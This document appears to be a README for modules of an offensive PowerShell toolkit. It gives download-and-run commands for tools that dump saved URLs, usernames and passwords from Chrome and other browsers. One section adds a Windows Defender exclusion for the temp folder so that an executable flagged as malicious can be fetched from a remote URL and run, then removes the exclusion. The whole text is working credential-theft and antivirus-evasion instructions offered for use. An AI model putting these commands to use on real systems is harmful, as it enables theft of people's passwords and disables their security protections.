## Module Name
   <b><i>DumpChromePasswords.ps1</i></b>

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|DumpChromePasswords|dumps URLs, usernames, and passwords from Chrome.|User Land|Only dumps chrome browser|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/DumpChromePasswords.ps1" -OutFile "DumpChromePasswords.ps1"
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip" -OutFile "sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip"
```

**prerequisites:**
``` 
   1. You must have the System.Data.SQLite.dll handy (see below)
   2. Your database must be accessible (close Chrome, or make some copy)
   3. It must by your database. If Chrome cannot open it, the script will probably fail as well.
```

```powershell
.\DumpChromePasswords.ps1
```

<br />


## Module Name
   <b><i>HarvestBrowserPasswords.exe</i></b>

|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|HarvestBrowserPasswords|dumps URLs, usernames, and passwords from major browsers.|User Land|Dumps major browsers|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/HarvestBrowserPasswords.exe" -OutFile "HarvestBrowserPasswords.exe"
```

```powershell
.\HarvestBrowserPasswords.exe -a, --all
.\HarvestBrowserPasswords.exe -f, --firefox
.\HarvestBrowserPasswords.exe -c, --chrome
```

<br />


## Module Name
   <b><i>ChromePass.exe - UNDER-DEVELOP (NOT-STABLE)</i></b>
   
|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|ChromePass|dumps usernames, passwords from chrome|Administrator|[Invoke-Exclusions.ps1](https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#module-name) - Evade AV\Download PE\Exec PE|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
```

<br />

**prerequesites checks:**
```powershell
#Make sure Windows Defender service its running
[bool](Get-Service -Name WinDefend)

#Make sure we have administrator privileges in shell
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")

#Make sure required modules are present\loaded
[bool]((Get-Module -ListAvailable -Name ConfigDefender).ExportedCommands|findstr /C:"Get-MpPreference")

[bool]((Get-Module -ListAvailable -Name ConfigDefender).ExportedCommands|findstr /C:"Set-MpPreference")

[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference")
```

```powershell
#Get Exclusions List
.\Invoke-Exclusions.ps1 -action "query"

## Add WD exclusion (To execute ChromePass.exe) + download (ChromePass.exe)  + execute (ChromePass.exe)
# exclusion cmdline: Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
.\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"

#Remove ExclusionPath "$Env:TMP" from Windows Defender list
.\Invoke-Exclusions.ps1 -action "del" -type "ExclusionPath" -Exclude "$Env:TMP"
```

<br />

## Final Notes
```
ChromePass.exe standalone executable its flagged by AV as malicious, thats why we are executing Invoke-Exclusions cmdlet.
The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download\Execute ChromePass.exe from that location.

Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (ChromePass.exe).
Warning: Invoke-Exclusions will 'NOT' delete itself or ChromePass.exe (deliver by -Uri parameter) at the end of execution.
```
